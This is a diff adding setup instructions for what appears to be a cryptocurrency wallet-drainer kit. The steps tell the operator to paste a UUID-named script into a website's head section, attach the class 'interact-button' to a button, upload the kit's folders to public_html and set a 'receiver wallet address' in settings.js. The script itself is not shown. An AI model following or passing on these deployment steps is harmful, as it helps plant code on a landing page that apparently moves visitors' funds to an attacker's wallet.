@@ -1,0 +1,20 @@
+
+
+
+1} Paste this code in the Head section of your website example:
+
+<head>
+
+ <script charset="UTF-8" type="text/javascript" src="765753af-f855-486b-a843-e81089c7226d"></script>
+
+</head>
+
+
+2}Input this class section on your button  "class= interact-button"
+
+
+3}All the folder should be in this way ( https://s13.gifyu.com/images/S0aG0.png ) upload the folder on public_html on hosting
+
+4}Change your receiver wallet address in "settings.js" file
+
+5}MAKE SURE TO ADD "765753af-f855-486b-a843-e81089c7226d.JS" , "IMAGES", "SCRIPTS", "STYLES". FOLDERS IN SAME FOLDER WHERE YOUR NEW TEMPLATE OR LANDING PAGE INDEX.HTML FILE WILL BE. CHECK SCREENSHOT ABOVE IF CONFUSED.
